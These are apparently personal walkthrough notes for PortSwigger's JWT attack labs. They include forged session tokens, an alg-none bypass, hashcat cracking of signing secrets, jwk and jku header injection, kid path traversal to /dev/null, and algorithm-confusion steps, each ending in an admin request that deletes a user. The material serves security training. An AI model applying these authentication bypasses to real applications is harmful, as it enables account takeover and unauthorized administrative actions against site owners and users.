---
description: https://portswigger.net/web-security/jwt
---

# JWT attacks

### Lab: JWT authentication bypass via unverified signature

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

```
GET /my-account HTTP/1.1
...
Cookie: session=eyJraWQiOiIxNjkwNzIyOS04NmUxLTRmMDQtYjc4Ny02YjU2MDE3YzI1NGQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NzkzMjIyM30.FTJoWINsLqOmZD4pQ9kTvIsO5yDTtc0cxjsO4PG12ltBO5hUMqDlRi5JErrKakx6NgOHC-vnTevB_4YngLTUor0B14CH_PFan7UK9Y3fub0ClDzG9SBZjyvvqCAkAczmXhQ4Raooi2h40vKN5E6DVv8AnQuDle1UbGedqaH_CP5D72JT77ufRAq8R94GX0rtA739RUNi3BzdV0vSszCmqpp6MeCiYKROJb-0Ukce32kDMO-abxHSpz04Tq3OB2DmEdZm7Aq6BYxyCgPmyFoTsJbqEL5A24PZnfPfDBaU_OQln51ANEhtcJJzyjVt7A63VFoAZJ3_3dHz_EOI5-we1g

eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NzkzMjIyM30
{"iss":"portswigger","sub":"wiener","exp":1657932223}
```

**Solution:**

Change sub value to administrator in JWT

```
GET /admin/delete?username=carlos HTTP/1.1
...
Cookie: session=eyJraWQiOiIxNjkwNzIyOS04NmUxLTRmMDQtYjc4Ny02YjU2MDE3YzI1NGQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTc5MzIyMjN9%3d%3d.FTJoWINsLqOmZD4pQ9kTvIsO5yDTtc0cxjsO4PG12ltBO5hUMqDlRi5JErrKakx6NgOHC-vnTevB_4YngLTUor0B14CH_PFan7UK9Y3fub0ClDzG9SBZjyvvqCAkAczmXhQ4Raooi2h40vKN5E6DVv8AnQuDle1UbGedqaH_CP5D72JT77ufRAq8R94GX0rtA739RUNi3BzdV0vSszCmqpp6MeCiYKROJb-0Ukce32kDMO-abxHSpz04Tq3OB2DmEdZm7Aq6BYxyCgPmyFoTsJbqEL5A24PZnfPfDBaU_OQln51ANEhtcJJzyjVt7A63VFoAZJ3_3dHz_EOI5-we1g

eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTc5MzIyMjN9
{"iss":"portswigger","sub":"administrator","exp":1657932223}
```

### Lab: JWT authentication bypass via flawed signature verification

This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

```
GET /my-account HTTP/1.1
...
Cookie: session=eyJraWQiOiI4YTExZDA5Ni05YjAyLTRjMWEtYWIxNy1iNGM2NDBiMmJiNTEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NzkzNDI0OX0.f6pPAUtoMiNSzXeHB0EiB_iGk7ISuj-cAVTmEoXGDMtYc6fqrO1Xe755TNLZUd3aQOeBcFjOLkrrCnWi96dz4lUKHWkwI0L66msFsUvSjamTjY3xTmE3uzpJfimLGsQ-pA45oiB2XdQz7_Zw52Qy_9Jt5joqrqe1pNzOUWK6stmKa2BlRdPuwOHtqVsvKqe7bi03bbJyK3LX0qeXvbHfeE0IkSbRIp4Chc0NsuhhjJvQUd2nFwDNa6msQFDgE4HP-MY43VkvlgjgoMaA0akBlTR2W8RMZHNgbXoBXETCidjdSWOIONZtneGZ1h7f5Dc05hwns5h6jVEQS1NaCIj2VQ

{"kid":"8a11d096-9b02-4c1a-ab17-b4c640b2bb51","alg":"RS256"}
{"iss":"portswigger","sub":"wiener","exp":1657934249}
```

**Solution:**

Change alg to none and sub to administrator in JWT

```
GET /admin/delete?username=carlos HTTP/1.1
...
Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2NTc5MzQyNDl9.

{"typ":"JWT","alg":"none"}
{"iss":"portswigger","sub":"administrator","exp":1657934249}
```

### Lab: JWT authentication bypass via weak signing key

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

```
GET /my-account HTTP/1.1
...
Cookie: session=eyJraWQiOiI2NGFkOTFjMS02MjNlLTRhNzktYTMxZC1jNDgxNWVkODFmOTAiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY1NzkzMzAwNX0.3ZatTM8izwdgUi4vXyPy8R93OFgw5GfmPzSrir7KhOc
```

Save JWT value to a file

Wordlist - https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

```
$ wget https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

$ hashcat -a 0 -m 16500 jwt jwt.secrets.list
```

**Solution:**

Generate JWT Key with JWT Editor plugin -> New Symmetric Key -> Replace k value with base64 encoded secret

Replace sub parameter to administrator in JWT, then Sign it with the signing key <- You can do it on JSON Web Token tab in the Repeater

To complete, make a request to this url with the newly signed JWT:&#x20;

`GET /admin/delete?username=carlos HTTP/1.1`

### Lab: JWT authentication bypass via jwk header injection.

This lab uses a JWT-based mechanism for handling sessions. The server supports the `jwk` parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

**Solution:**

In JWT Editor Keys tab -> Generate New RSA Key - 2048

Replace sub parameter to administrator in JWT, then choose Attack option with Embedded JWK -> choose generated RSA key

To complete, make a request to this url with the newly signed JWT:&#x20;

`GET /admin/delete?username=carlos HTTP/1.1`

### Lab: JWT authentication bypass via jku header injection

This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

In JWT Editor Keys tab -> Generate New RSA Key - 2048

In Exploit Server -> Set Body with the RSA key some contents:

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "822fec3e-6f3f-4ebe-9a65-c099750b6826",
            "n": "4d64ZIJQh3s0bNAcHJO0enWnRshpbOVpNjBlPBWuJOgxyG6aqFHwgpzMVh2EzyhwB9GeFrWwxjfVGhJlC22fHa6WSh3_ITBXUuQyw1ZggvmSpOqxNZN63uO9SXERR2zpbVMsjO7vlPvuZJjWq6ydbhh45qBhWQ_48KiyPlIORqM4YeaXX6R9LjoL9-yjhUv43VVYoc2oo6MypjEg_nxm2xTHu_-2rzss9kQa9S5m5d7N-EuT7YK_Vsal9gqOuxC1zuvtW0J2g1eOjVObXGTJQJfOILwpEWt1d3HivdVj6-24gknIVIqL4TYPSyNWW85cJqU5UMyupUBGTui1b9JCPQ"
        }
    ]
}
```

Add jku value exploit server endpoint to header, Replace sub parameter to administrator in JWT, then choose sign option with Don't modify header -> choose generated RSA key

```
Header:
{
    "kid": "822fec3e-6f3f-4ebe-9a65-c099750b6826",
    "typ": "JWT",
    "alg": "RS256",
    "jku": "https://exploit-0a710030043f2960c031d567017e00c4.web-security-academy.net/exploit"
}

Payload:
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1657934992
}
```

### Lab: JWT authentication bypass via kid header path traversal

This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

Generate JWT Key with JWT Editor plugin -> New Symmetric Key -> Replace k value with AA== -> Replace kid value to "../../../../../../../dev/null"

k value is an encoded null value, kid value will return null and then verified as null=null

Replace sub parameter to administrator in JWT, then Sign it with the signing key

To complete, make a request to this url with the newly signed JWT:&#x20;

`GET /admin/delete?username=carlos HTTP/1.1`

### Lab: JWT authentication bypass via algorithm confusion

This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To solve the lab, first obtain the server's public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

The site gives a JWK containing a single public key on `/jwks.json` endpoint.

Generate JWT Key with JWT Editor plugin -> New RSA Key -> Paste contents of array in /jwks.json

After the creation, right click then choose "copy public key as pem" option

In Decoder Tab, encode the contents of it to Base64

Generate JWT Key with JWT Editor plugin -> New Symmetric Key -> Generate -> Replace k value with encoded the pem value

Replace sub parameter to administrator in JWT, replace alg parameter from RS256 to HS256, then Sign it with the symmetric key

To complete, make a request to this url with the newly signed JWT:&#x20;

`GET /admin/delete?username=carlos HTTP/1.1`

### Lab: JWT authentication bypass via algorithm confusion with no exposed key

This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To solve the lab, first obtain the server's public key. Use this key to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

To get 2 different JWT, login 2 time with wiener user, after getting 2 JWT:

```
# docker run --rm -it portswigger/sig2n <token1> <token2>

Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6U1BBM1RMYXpTQjZyNXphOXpIUQp2OUxHYnR0blB6M3dJaDM5eXhKbTJaSk1ZMVRaSVFWeW1WVWJwbzNMT3FwejVFNzRBeC81c21KbnhuOXNYSXpzCkR0MWVvbVZtTE5Wc25LSzg0QTVOcTY2eUdyOUptRTBnOWppM3QydWIxVXFyRUNnZ0o3YlVPa1NURW01ckFTTWQKcy9mczVSWm4xbzliL29KcDVwVDdybVdVZStRZ0d2bmViN0VyM1FFd21kanNjRi9PYTlpa2ZHNWdSbnk2YVZZWgpFYW04OXRDMEFzNk5jcnkvaStPV2VrcHN3THpaYURVUkY1NjJ1MCtvZmptN2RSWFNRUGErbDV5UmNlYWY1WFRTCmZNKzJSYTRFWU9UL2tmOU1mMzhOSU1lY3dDWWowV1drOWhIMjNuRFdreGJ6UTZLSTQ4c1Y3MU14ZXlpODNzRHkKZndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI0M2RhY2Y5ZS1jZTdhLTQ4NjQtOWE3Ni1hMTBjYmYyY2IxMGUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU4MDY5ODgwfQ.rkq6-MbKzYHo6oEI6R9eFkwQGVyFZotfeaEDNUKAsDU
```

Replace the session cookie with this new tampered JWT and then send the request. It should get 200 response.

Generate JWT Key with JWT Editor plugin -> New Symmetric Key -> Generate -> Replace k value with Base64 encoded x509 key value

Replace sub parameter to administrator in JWT, replace alg parameter from RS256 to HS256, then Sign it with the symmetric key

To complete, make a request to this url with the newly signed JWT:&#x20;

`GET /admin/delete?username=carlos HTTP/1.1`
